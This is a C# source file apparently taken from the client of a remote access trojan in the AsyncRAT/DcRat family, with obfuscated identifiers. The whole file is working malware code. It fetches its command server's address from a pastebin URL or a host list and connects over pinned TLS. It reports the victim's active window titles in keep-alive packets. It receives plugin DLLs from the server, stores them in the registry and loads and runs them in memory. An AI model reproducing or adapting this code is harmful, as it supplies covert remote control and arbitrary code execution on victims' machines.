﻿using Client.Helper;
using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Threading;
using System.Net.Security;
using System.Security.Authentication;
using System.Security.Cryptography.X509Certificates;
using System.Net;
using MessagePackLib.MessagePack;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Linq.Expressions;
using Microsoft.VisualBasic.ApplicationServices;
using System.Text.RegularExpressions;

namespace Client.Connection
{
    public static class ClientSocket
    {
        public static Socket TcpClient { get; set; } //Main socket
        public static Socket TcpClientV6 { get; set; } //Main socket for v6
        public static SslStream SslClient { get; set; } //Main SSLstream
        private static byte[] Buffer { get; set; } //Socket buffer
        private static long HeaderSize { get; set; } //Recevied size
        private static long Offset { get; set; } // Buffer location
        private static Timer KeepAlive { get; set; } //Send Performance
        public static bool IsConnected { get; set; } //Check socket status
        public static bool IsConnectedV6 { get; set; } //Check socket status
        private static object SendSync { get; } = new object(); //Sync send
        private static Timer Ping { get; set; } //Send ping interval
        public static int Interval { get; set; } //ping value
        public static bool ActivatePo_ng { get; set; }

        public static List<MsgPack> Packs = new List<MsgPack>();

        public static void InitializeClient() //Connect & reconnect
        {
            try
            {

                TcpClient = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
                {
                    ReceiveBufferSize = 50 * 1024,
                    SendBufferSize = 50 * 1024,
                }; //for ipv4

                TcpClientV6 = new Socket(AddressFamily.InterNetworkV6, SocketType.Stream, ProtocolType.Tcp)
                {
                    ReceiveBufferSize = 50 * 1024,
                    SendBufferSize = 50 * 1024,
                }; // for ipv6

                if (Settings.Paste_bin == "null")
                {
                    string ServerIP = Settings.Hos_ts.Split(',')[new Random().Next(Settings.Hos_ts.Split(',').Length)];
                    int ServerPort = Convert.ToInt32(Settings.Por_ts.Split(',')[new Random().Next(Settings.Por_ts.Split(',').Length)]);

                    if (IsValidDomainName(ServerIP))
                    {
                        IPAddress[] addresslist = Dns.GetHostAddresses(ServerIP);
                        //Debug.WriteLine(ServerIP);
                        foreach (IPAddress theaddress in addresslist)
                        {
                            try
                            {
                                IPAddress ipFor4Or6;
                                if (IPAddress.TryParse(ServerIP, out ipFor4Or6))
                                {
                                    //Debug.WriteLine(theaddress);
                                    switch (ipFor4Or6.AddressFamily)
                                    {
                                        case System.Net.Sockets.AddressFamily.InterNetwork:
                                            TcpClient.Connect(theaddress, ServerPort);
                                            if (TcpClient.Connected)
                                            {
                                                //Debug.WriteLine("Connected!ipv4");
                                                goto Endloop;
                                                //break; // IPv4
                                            }
                                            break;
                                        case System.Net.Sockets.AddressFamily.InterNetworkV6:
                                            TcpClientV6.Connect(theaddress, ServerPort);
                                            if (TcpClientV6.Connected)
                                            {
                                                //Debug.WriteLine("Connected!ipv6");
                                                goto Endloop;
                                                //break; // IPv6
                                            }
                                            break;
                                    }
                                }

                            }
                            catch (SocketException error)
                            {
                                int errorCode = error.ErrorCode;
                                Debug.WriteLine(errorCode);
                            }
                        }
                    }
                    else
                    {
                        IPAddress ipFor4Or6;
                        if (IPAddress.TryParse(ServerIP, out ipFor4Or6))
                        {
                            switch (ipFor4Or6.AddressFamily)
                            {
                                case System.Net.Sockets.AddressFamily.InterNetwork:
                                    TcpClient.Connect(ServerIP, ServerPort);
                                    if (TcpClient.Connected) break;// IPv4
                                    break;
                                case System.Net.Sockets.AddressFamily.InterNetworkV6:
                                    TcpClientV6.Connect(ServerIP, ServerPort);
                                    if (TcpClientV6.Connected) break;// IPv6
                                    break;
                            }
                        }
                    }
                }
                else //下载ip and port to conect form paste-bin
                {
                    using (WebClient wc = new WebClient())
                    {
                        NetworkCredential networkCredential = new NetworkCredential("", "");
                        wc.Credentials = networkCredential;
                        string resp = wc.DownloadString(Settings.Paste_bin);
                        Match match = Regex.Match(resp, @"ip = {(\[[^\]]+\])} port = {(\d+)}");
                        if (match.Success)
                        {
                            string ipAddressWithBrackets = match.Groups[1].Value;
                            string port = match.Groups[2].Value;
                            string ipFormPaste = ipAddressWithBrackets.Trim('[',']');

                            Settings.Hos_ts = ipFormPaste;
                            Settings.Por_ts = port;
                        }
                        //Debug.WriteLine(Settings.Hos_ts);
                        // 新增代码，判断远程主机地址类型
                        IPAddress remoteIpAddress;
                        if (IPAddress.TryParse(Settings.Hos_ts, out remoteIpAddress))
                        {
                            AddressFamily addressFamily = remoteIpAddress.AddressFamily;

                            // 根据地址类型选择连接方式
                            if (addressFamily == AddressFamily.InterNetworkV6)
                            {
                                TcpClientV6.Connect(Settings.Hos_ts, Convert.ToInt32(Settings.Por_ts));
                            }
                            else
                            {
                                TcpClient.Connect(Settings.Hos_ts, Convert.ToInt32(Settings.Por_ts));
                            }
                        }
                    }
                }
                Endloop:
                if (TcpClient.Connected) //check for ipv4 connected
                {
                    //Debug.WriteLine("Connected!ipv4 check");
                    IsConnected = true;
                    SslClient = new SslStream(new NetworkStream(TcpClient, true), false, ValidateServerCertificate);
                    SslClient.AuthenticateAsClient(TcpClient.RemoteEndPoint.ToString().Split(':')[0], null, SslProtocols.Tls, false);
                    HeaderSize = 4;
                    Buffer = new byte[HeaderSize];
                    Offset = 0;
                    Send(IdSender.SendInfo());
                    Interval = 0;
                    ActivatePo_ng = false;
                    KeepAlive = new Timer(new TimerCallback(KeepAlivePacket), null, new Random().Next(10 * 1000, 15 * 1000), new Random().Next(10 * 1000, 15 * 1000));
                    Ping = new Timer(new TimerCallback(Po_ng), null, 1, 1);
                    SslClient.BeginRead(Buffer, (int)Offset, (int)HeaderSize, ReadServertData, null);
                }
                else
                {
                    Debug.WriteLine("notConnected!ipv4 check");
                    IsConnected = false;


                    if (TcpClientV6.Connected) //check for ipv6 connected
                    {
                        //Debug.WriteLine("Connected!Ipv6 check");
                        IsConnectedV6 = true;
                        SslClient = new SslStream(new NetworkStream(TcpClientV6, true), false, ValidateServerCertificate);
                        SslClient.AuthenticateAsClient(TcpClientV6.RemoteEndPoint.ToString().Split(':')[0], null, SslProtocols.Tls, false);
                        HeaderSize = 4;
                        Buffer = new byte[HeaderSize];
                        Offset = 0;
                        Send(IdSender.SendInfo());
                        Interval = 0;
                        ActivatePo_ng = false;
                        KeepAlive = new Timer(new TimerCallback(KeepAlivePacket), null, new Random().Next(10 * 1000, 15 * 1000), new Random().Next(10 * 1000, 15 * 1000));
                        Ping = new Timer(new TimerCallback(Po_ng), null, 1, 1);
                        SslClient.BeginRead(Buffer, (int)Offset, (int)HeaderSize, ReadServertData, null);
                    }
                    else
                    {
                        //Debug.WriteLine("notConnected!Ipv6 check");
                        IsConnectedV6 = false;
                        return;
                    }
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"An error occurred: {ex.ToString()}");
                Debug.WriteLine("Disconnected! error 0x001");
                IsConnected = false;
                IsConnectedV6 = false;
                return;
            }
        }

        private static bool IsValidDomainName(string name)
        {
            return Uri.CheckHostName(name) != UriHostNameType.Unknown;
        }

        private static bool ValidateServerCertificate(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
        {
#if DEBUG
            return true;
#endif
            return Settings.Server_Certificate.Equals(certificate);
        }

        public static void Reconnect()
        {

            try
            {
                Ping?.Dispose();
                KeepAlive?.Dispose();
                SslClient?.Dispose();
                TcpClient?.Dispose();
                TcpClientV6?.Dispose();
            }
            catch 
            {
                Debug.WriteLine("error2 0x002");
            }
            IsConnected = false;
            IsConnectedV6 = false;
        }

        public static void ReadServertData(IAsyncResult ar) //Socket read/recevie
        {
            try
            {
                if (!TcpClient.Connected || !IsConnected)
                {
                    IsConnected = false;
                    if (!TcpClientV6.Connected || !IsConnectedV6)
                    {
                        IsConnectedV6 = false;
                        return;
                    }
                    else
                    {
                        goto Isconnected;
                    }
                }
                else 
                {
                goto Isconnected;
                }

            Isconnected: //isconnected
                //Debug.WriteLine("Connected ipv4/ipv6");
                int recevied = SslClient.EndRead(ar);
                if (recevied > 0)
                {
                    Offset += recevied;
                    HeaderSize -= recevied;
                    if (HeaderSize == 0)
                    {
                        HeaderSize = BitConverter.ToInt32(Buffer, 0);
                        Debug.WriteLine("/// Client Buffersize " + HeaderSize.ToString() + " Bytes  ///");
                        if (HeaderSize > 0)
                        {
                            Offset = 0;
                            Buffer = new byte[HeaderSize];
                            while (HeaderSize > 0)
                            {
                                int rc = SslClient.Read(Buffer, (int)Offset, (int)HeaderSize);
                                if (rc <= 0)
                                {
                                    IsConnected = false;
                                    IsConnectedV6 = false;
                                    return;
                                }
                                Offset += rc;
                                HeaderSize -= rc;
                                if (HeaderSize < 0)
                                {
                                    IsConnected = false;
                                    IsConnectedV6 = false;
                                    return;
                                }
                            }
                            Thread thread = new Thread(new ParameterizedThreadStart(Read));
                            thread.Start(Buffer);
                            Offset = 0;
                            HeaderSize = 4;
                            Buffer = new byte[HeaderSize];
                        }
                        else
                        {
                            HeaderSize = 4;
                            Buffer = new byte[HeaderSize];
                            Offset = 0;
                        }
                    }
                    else if (HeaderSize < 0)
                    {
                        IsConnected = false;
                        IsConnectedV6 = false;
                        return;
                    }
                    SslClient.BeginRead(Buffer, (int)Offset, (int)HeaderSize, ReadServertData, null);
                }
                else
                {
                    IsConnected = false;
                    IsConnectedV6 = false;
                    return;
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine("Exception in ReadServertData: " + ex.ToString());
                IsConnected = false;
                IsConnectedV6 = false;
                return;
            }
        }

        public static void Send(byte[] msg)
        {
            lock (SendSync)
            {
                try
                {
                    if (!IsConnected)
                    {
                        if (!IsConnectedV6)
                        {
                            return;
                        }
                        else
                        {
                            goto next;
                        }
                    }
                    else
                    {
                        goto next;
                    }
                    next:
                    byte[] buffersize = BitConverter.GetBytes(msg.Length);

                    if (IsConnectedV6)
                    {
                        TcpClientV6.Poll(-1, SelectMode.SelectWrite);
                        SslClient.Write(buffersize, 0, buffersize.Length);
                        if (msg.Length > 1000000) //1mb
                        {
                            using (MemoryStream memoryStream = new MemoryStream(msg))
                            {
                                int read = 0;
                                memoryStream.Position = 0;
                                byte[] chunk = new byte[50 * 1000];
                                while ((read = memoryStream.Read(chunk, 0, chunk.Length)) > 0)
                                {
                                    TcpClientV6.Poll(-1, SelectMode.SelectWrite);
                                    SslClient.Write(chunk, 0, read);
                                    SslClient.Flush();
                                }
                            }
                        }
                        else
                        {
                            TcpClientV6.Poll(-1, SelectMode.SelectWrite);
                            SslClient.Write(msg, 0, msg.Length);
                            SslClient.Flush();
                        }
                    }
                    else if (IsConnected)
                    {
                        TcpClient.Poll(-1, SelectMode.SelectWrite);
                        SslClient.Write(buffersize, 0, buffersize.Length);

                        if (msg.Length > 1000000) //1mb
                        {
                            using (MemoryStream memoryStream = new MemoryStream(msg))
                            {
                                int read = 0;
                                memoryStream.Position = 0;
                                byte[] chunk = new byte[50 * 1000];
                                while ((read = memoryStream.Read(chunk, 0, chunk.Length)) > 0)
                                {
                                    TcpClient.Poll(-1, SelectMode.SelectWrite);
                                    SslClient.Write(chunk, 0, read);
                                    SslClient.Flush();
                                }
                            }
                        }
                        else
                        {
                            TcpClient.Poll(-1, SelectMode.SelectWrite);
                            SslClient.Write(msg, 0, msg.Length);
                            SslClient.Flush();
                        }
                    }
                }
                catch (Exception ex)
                {
                    Debug.WriteLine("error1");
                    Debug.WriteLine($"An error occurred while sending message: {ex.Message}");
                    IsConnected = false;
                    IsConnectedV6 = false;
                    return;
                }
            }
        }

        public static void KeepAlivePacket(object obj)
        {
            try
            {
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "Ping";
                msgpack.ForcePathObject("Message").AsString = Methods.GetActiveWindowTitle();
                Send(msgpack.Encode2Bytes());
                GC.Collect();
                ActivatePo_ng = true;
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"An error occurred while sending message: {ex.Message}");
            }
        }

        private static void Po_ng(object obj)
        {
            try
            {
                if (ActivatePo_ng && IsConnected)
                {
                    Interval++;
                }
                if (ActivatePo_ng && IsConnectedV6) 
                {
                    Interval++;
                
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"An error occurred in Po_ng: {ex.Message}");
                // 其他异常处理逻辑，根据需要
            }
        }

        public static void Read(object data)
        {
            try
            {
                MsgPack unpack_msgpack = new MsgPack();
                unpack_msgpack.DecodeFromBytes((byte[])data);
                switch (unpack_msgpack.ForcePathObject("Pac_ket").AsString)
                {
                    case "Po_ng": //send interval value to server
                        {
                            ClientSocket.ActivatePo_ng = false;
                            MsgPack msgPack = new MsgPack();
                            msgPack.ForcePathObject("Pac_ket").SetAsString("Po_ng");
                            msgPack.ForcePathObject("Message").SetAsInteger(ClientSocket.Interval);
                            ClientSocket.Send(msgPack.Encode2Bytes());
                            ClientSocket.Interval = 0;
                            break;
                        }

                    case "plu_gin": // run plugin in memory
                        {
                            try
                            {
                                if (SetRegistry.GetValue(unpack_msgpack.ForcePathObject("Dll").AsString) == null) // check if plugin is installed
                                {
                                    Packs.Add(unpack_msgpack); //save it for later
                                    MsgPack msgPack = new MsgPack();
                                    msgPack.ForcePathObject("Pac_ket").SetAsString("sendPlugin");
                                    msgPack.ForcePathObject("Hashes").SetAsString(unpack_msgpack.ForcePathObject("Dll").AsString);
                                    ClientSocket.Send(msgPack.Encode2Bytes());
                                }
                                else
                                Invoke(unpack_msgpack);
                            }
                            catch (Exception ex)
                            {
                                Error(ex.Message);
                            }
                            break;
                        }

                    case "save_Plugin": // save plugin
                        {
                            SetRegistry.SetValue(unpack_msgpack.ForcePathObject("Hash").AsString, unpack_msgpack.ForcePathObject("Dll").GetAsBytes());
                            Debug.WriteLine("plugin saved");
                            foreach (MsgPack msgPack in Packs.ToList())
                            {
                                if (msgPack.ForcePathObject("Dll").AsString == unpack_msgpack.ForcePathObject("Hash").AsString)
                                {                                    
                                    Invoke(msgPack);
                                    Packs.Remove(msgPack);
                                }
                            }
                            break;
                        }
                }
            }
            catch (Exception ex)
            {
                Error(ex.Message);
            }
        }

        private static void Invoke(MsgPack unpack_msgpack)
        {
            Assembly assembly = AppDomain.CurrentDomain.Load(Zip.Decompress(SetRegistry.GetValue(unpack_msgpack.ForcePathObject("Dll").AsString)));
            Type type = assembly.GetType("Plugin.Plugin");
            dynamic instance = Activator.CreateInstance(type);
            if (IsConnectedV6)
            {
                instance.Run(ClientSocket.TcpClientV6, Settings.Server_Certificate, Settings.Hw_id, unpack_msgpack.ForcePathObject("Msgpack").GetAsBytes(), MutexControl.currentApp, Settings.MTX, Settings.BS_OD, Settings.In_stall);
                goto Next1;
            }
            else
            {
                if (IsConnected)
                {
                    instance.Run(ClientSocket.TcpClient, Settings.Server_Certificate, Settings.Hw_id, unpack_msgpack.ForcePathObject("Msgpack").GetAsBytes(), MutexControl.currentApp, Settings.MTX, Settings.BS_OD, Settings.In_stall);
                    goto Next1;
                }
                else
                {
                    return;
                }
            }
            Next1:
            Received();
        }

        private static void Received() //reset client forecolor
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = Encoding.Default.GetString(Convert.FromBase64String("UmVjZWl2ZWQ="));//"Received"
            ClientSocket.Send(msgpack.Encode2Bytes());
            Thread.Sleep(1000);
        }

        public static void Error(string ex) //send to logs
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "Error";
            msgpack.ForcePathObject("Error").AsString = ex;
            ClientSocket.Send(msgpack.Encode2Bytes());
        }
    }    
}
